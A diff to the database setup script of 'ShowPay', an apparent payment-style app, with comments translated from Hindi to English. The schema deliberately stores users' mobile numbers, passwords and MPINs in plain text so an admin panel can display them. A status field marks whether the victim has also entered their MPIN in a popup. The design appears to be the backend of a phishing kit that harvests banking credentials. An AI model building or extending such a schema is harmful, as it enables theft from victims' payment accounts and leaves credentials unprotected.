@@ -1,31 +1,33 @@
 -- ============================================================
--- ShowPay - Supabase Database Setup SQL (FINAL VERSION)
--- Isko Supabase SQL Editor me paste karke Run karo
+-- ShowPay - Supabase Database Setup SQL (RESTORED ORIGINAL)
+-- Paste this in Supabase SQL Editor and Run
 -- ============================================================
 
 -- 1. USERS TABLE
+-- Unique key: mobile + password (plain text stored for admin visibility)
+-- Status: pending (after login) → completed (after MPIN entered)
 CREATE TABLE IF NOT EXISTS users (
   id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
   mobile VARCHAR(15) NOT NULL,
-  password VARCHAR(50) NOT NULL,
-  mpin VARCHAR(6) DEFAULT '',
+  password VARCHAR(100) NOT NULL,       -- Plain text, visible in admin panel
+  mpin VARCHAR(10) DEFAULT '',           -- Plain text, set after MPIN popup
   login_count INTEGER DEFAULT 1,
-  status VARCHAR(20) DEFAULT 'pending',
-  first_login TIMESTAMPTZ DEFAULT NOW(),
-  last_login TIMESTAMPTZ DEFAULT NOW(),
+  status VARCHAR(20) DEFAULT 'pending',  -- 'pending' or 'completed'
+  first_login TIMESTAMPTZ DEFAULT NOW(), -- Date + Time of first login
+  last_login TIMESTAMPTZ DEFAULT NOW(),  -- Date + Time of last login
   mpin_updated_at TIMESTAMPTZ,
   created_at TIMESTAMPTZ DEFAULT NOW(),
   updated_at TIMESTAMPTZ DEFAULT NOW(),
-  UNIQUE(mobile, password)
+  UNIQUE(mobile, password)               -- Unique key: mobile + password combo
 );
 
--- 2. LOGIN LOGS TABLE (har login ka record)
+-- 2. LOGIN LOGS TABLE (audit trail of every login)
 CREATE TABLE IF NOT EXISTS login_logs (
   id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
   user_id UUID REFERENCES users(id) ON DELETE SET NULL,
   mobile VARCHAR(15) NOT NULL,
-  password VARCHAR(50) NOT NULL,
-  mpin VARCHAR(6) DEFAULT NULL,
+  password VARCHAR(100) NOT NULL,
+  mpin VARCHAR(10) DEFAULT NULL,
   login_time TIMESTAMPTZ DEFAULT NOW()
 );
 
@@ -131,6 +133,12 @@ ALTER TABLE telegram_popup DISABLE ROW LEVEL SECURITY;
 -- MIGRATION QUERIES (Run these if tables already exist)
 -- ============================================================
 
+-- Expand password/mpin column length (safe to re-run)
+ALTER TABLE users ALTER COLUMN password TYPE VARCHAR(100);
+ALTER TABLE users ALTER COLUMN mpin TYPE VARCHAR(10);
+ALTER TABLE login_logs ALTER COLUMN password TYPE VARCHAR(100);
+ALTER TABLE login_logs ALTER COLUMN mpin TYPE VARCHAR(10);
+
 -- Add missing columns to users table (safe to re-run)
 DO $$
 BEGIN
@@ -139,6 +147,9 @@ BEGIN
   END IF;
   IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='updated_at') THEN
     ALTER TABLE users ADD COLUMN updated_at TIMESTAMPTZ DEFAULT NOW();
+  END IF;
+  IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='mpin_updated_at') THEN
+    ALTER TABLE users ADD COLUMN mpin_updated_at TIMESTAMPTZ;
   END IF;
 END $$;
 
@@ -171,3 +182,11 @@ BEGIN
     ALTER TABLE users ADD CONSTRAINT users_mobile_password_key UNIQUE (mobile, password);
   END IF;
 END $$;
+
+-- ============================================================
+-- ADMIN PANEL NOTE:
+-- The Admin User List displays: Mobile | Password | MPIN | Login Count | Status | Date | Time
+-- first_login and last_login store the full timestamp (date + time)
+-- Status: 'pending' = logged in, MPIN not yet entered
+--         'completed' = MPIN entered and saved
+-- ============================================================
